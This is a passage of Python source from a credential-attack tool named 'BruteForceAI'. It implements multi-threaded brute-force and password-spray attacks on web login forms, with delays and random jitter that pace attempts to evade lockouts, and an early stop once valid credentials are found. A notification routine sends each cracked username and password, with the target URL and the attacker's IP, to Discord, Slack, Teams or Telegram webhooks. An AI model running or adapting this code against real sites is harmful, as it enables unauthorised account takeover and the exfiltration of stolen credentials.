                    success = future.result()
                    if self.verbose:
                        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        status = 'SUCCESS' if success else 'FAILED'
                        print(f'🔑 [{timestamp}] [{completed}/{len(combinations)}] Tried: {username}:{password} - {status}')
                    else:
                        print(f'🔑 [{completed}/{len(combinations)}] Tried: {username}:{password} - {('SUCCESS' if success else 'FAILED')}')
                    if success:
                        if self.verbose:
                            success_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            print(f'🎉 [{success_timestamp}] SUCCESS! Valid credentials found: {username}:{password}')
                        else:
                            print(f'🎉 SUCCESS! Valid credentials found: {username}:{password}')
                        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        if self._has_webhooks_configured():
                            print(f'🔔 Sending success notifications...')
                        self._send_success_notification(url, username, password, timestamp)
                        if self.success_exit:
                            print(f'🚪 Success exit enabled - signaling other threads to stop')
                            success_found.set()
                            for remaining_future in future_to_creds:
                                if not remaining_future.done():
                                    remaining_future.cancel()
                            return
                except Exception as e:
                    if self.verbose:
                        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        print(f'❌ [{timestamp}] Error testing {username}:{password} - {e}')
                    else:
                        print(f'❌ Error testing {username}:{password} - {e}')

def _execute_passwordspray(self, url, selectors_data, threads):
    """
        Execute password spray attack (try each password against all usernames)
        """
    print(f'💦 Executing password spray attack on {url}')
    if self.delay > 0:
        print(f'⏱️  Delay between passwords: {self.delay}s')
    if self.jitter > 0:
        print(f'🎲 Random jitter: 0-{self.jitter}s')
    if self.success_exit:
        print(f'🚪 Success exit: Will stop after first successful login')
    for i, password in enumerate(self.passwords, 1):
        if self.verbose:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            print(f'\n🔑 [{timestamp}] [{i}/{len(self.passwords)}] Testing password: {password}')
        else:
            print(f'\n🔑 [{i}/{len(self.passwords)}] Testing password: {password}')
        current_usernames = self.usernames
        if not self.force_retry:
            original_count = len(current_usernames)
            current_usernames = [u for u in current_usernames if not self._attempt_exists(url, u, password)]
            skipped_count = original_count - len(current_usernames)
            if skipped_count > 0:
                print(f'   ⏭️  Skipped {skipped_count} existing attempts for password: {password}')
            if len(current_usernames) == 0:
                print(f'   ✅ All usernames already attempted for password: {password}')
                continue
        if threads == 1:
            for j, username in enumerate(current_usernames, 1):
                if self.verbose:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    print(f'   👤 [{timestamp}] [{j}/{len(current_usernames)}] Trying: {username}:{password}')
                else:
                    print(f'   👤 [{j}/{len(current_usernames)}] Trying: {username}:{password}')
                success = self._attempt_login(url, selectors_data, username, password)
                if success:
                    if self.verbose:
                        success_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        print(f'🎉 [{success_timestamp}] SUCCESS! Valid credentials found: {username}:{password}')
                    else:
                        print(f'🎉 SUCCESS! Valid credentials found: {username}:{password}')
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    if self._has_webhooks_configured():
                        print(f'🔔 Sending success notifications...')
                    self._send_success_notification(url, username, password, timestamp)
                    if self.success_exit:
                        print(f'🚪 Success exit enabled - stopping attack for {url}')
                        return
        else:
            if self.verbose:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                print(f'🧵 [{timestamp}] Using {threads} threads for password: {password}')
            else:
                print(f'🧵 Using {threads} threads for password: {password}')
            success_found = threading.Event() if self.success_exit else None
            with ThreadPoolExecutor(max_workers=threads) as executor:
                future_to_username = {executor.submit(self._attempt_login_with_success_check, url, selectors_data, username, password, success_found): username for username in current_usernames}
                completed = 0
                password_success = False
                for future in as_completed(future_to_username):
                    username = future_to_username[future]
                    completed += 1
                    try:
                        success = future.result()
                        if self.verbose:
                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            status = 'SUCCESS' if success else 'FAILED'
                            print(f'   👤 [{timestamp}] [{completed}/{len(current_usernames)}] Tried: {username}:{password} - {status}')
                        else:
                            print(f'   👤 [{completed}/{len(current_usernames)}] Tried: {username}:{password} - {('SUCCESS' if success else 'FAILED')}')
                        if success:
                            if self.verbose:
                                success_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                                print(f'🎉 [{success_timestamp}] SUCCESS! Valid credentials found: {username}:{password}')
                            else:
                                print(f'🎉 SUCCESS! Valid credentials found: {username}:{password}')
                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            if self._has_webhooks_configured():
                                print(f'🔔 Sending success notifications...')
                            self._send_success_notification(url, username, password, timestamp)
                            if self.success_exit:
                                print(f'🚪 Success exit enabled - stopping attack for {url}')
                                password_success = True
                                success_found.set()
                                for remaining_future in future_to_username:
                                    if not remaining_future.done():
                                        remaining_future.cancel()
                                break
                    except Exception as e:
                        if self.verbose:
                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            print(f'❌ [{timestamp}] Error testing {username}:{password} - {e}')
                        else:
                            print(f'❌ Error testing {username}:{password} - {e}')
            if password_success and self.success_exit:
                return
        if i < len(self.passwords) and (self.delay > 0 or self.jitter > 0):
            actual_delay = self._calculate_delay_with_jitter()
            if self.verbose:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                print(f'⏳ [{timestamp}] Waiting {actual_delay:.2f}s before next password...')
            else:
                print(f'⏳ Waiting {actual_delay:.2f}s before next password...')
            time.sleep(actual_delay)
        elif i < len(self.passwords):
            if self.verbose:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                print(f'⏳ [{timestamp}] Waiting 1s before next password...')
            else:
                print(f'⏳ Waiting 1s before next password...')
            time.sleep(1)

def _attempt_login_with_success_check(self, url, selectors_data, username, password, success_found):
    """
        Attempt login with success check for multi-threaded password spray
        """
    if success_found and success_found.is_set():
        return False
    return self._attempt_login(url, selectors_data, username, password)

def _attempt_login_with_delay_sync(self, url, selectors_data, username, password, all_combinations, success_found, username_last_attempt, username_locks):
    """
        Attempt login with synchronized delay logic for multi-threaded brute force
        This ensures proper delay between passwords for the same user across threads
        """
    if success_found and success_found.is_set():
        return False
    if (self.delay > 0 or self.jitter > 0) and username in username_locks:
        with username_locks[username]:
            current_time = time.time()
            last_attempt_time = username_last_attempt.get(username, 0)
            if last_attempt_time > 0:
                time_since_last = current_time - last_attempt_time
                required_delay = self._calculate_delay_with_jitter()
                if time_since_last < required_delay:
                    wait_time = required_delay - time_since_last
                    if self.verbose:
                        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        print(f'⏳ [{timestamp}] Thread waiting {wait_time:.2f}s for username {username}...')
                    time.sleep(wait_time)
            username_last_attempt[username] = time.time()
    if success_found and success_found.is_set():
        return False
    return self._attempt_login(url, selectors_data, username, password)

def _attempt_login_with_delay(self, url, selectors_data, username, password, all_combinations, success_found):
    """
        Attempt login with delay logic for multi-threaded brute force
        This tries to implement delay between passwords for the same user in multi-threaded mode
        """
    if success_found and success_found.is_set():
        return False
    if self.delay > 0 or self.jitter > 0:
        try:
            current_index = all_combinations.index((username, password))
            if current_index > 0:
                prev_username, prev_password = all_combinations[current_index - 1]
                if prev_username == username:
                    actual_delay = self._calculate_delay_with_jitter()
                    time.sleep(actual_delay)
        except ValueError:
            pass
    if success_found and success_found.is_set():
        return False
    return self._attempt_login(url, selectors_data, username, password)

def _send_success_notification(self, url, username, password, timestamp=None):
    """
        Send success notification to configured webhooks
        
        Args:
            url: Target URL where success occurred
            username: Successful username
            password: Successful password
            timestamp: Optional timestamp (defaults to current time)
        """
    if not timestamp:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    message_title = '🎉 BruteForceAI Success!'
    message_body = f'\n**Target:** {url}\n**Username:** {username}\n**Password:** {password}\n**Time:** {timestamp}\n**External IP:** {self.external_ip or 'Unknown'}\n'
    if self.discord_webhook:
        self._send_discord_notification(message_title, message_body, url, username, password, timestamp)
    if self.slack_webhook:
        self._send_slack_notification(message_title, message_body, url, username, password, timestamp)
    if self.teams_webhook:
        self._send_teams_notification(message_title, message_body, url, username, password, timestamp)
    if self.telegram_webhook and self.telegram_chat_id:
        self._send_telegram_notification(message_title, message_body, url, username, password, timestamp)

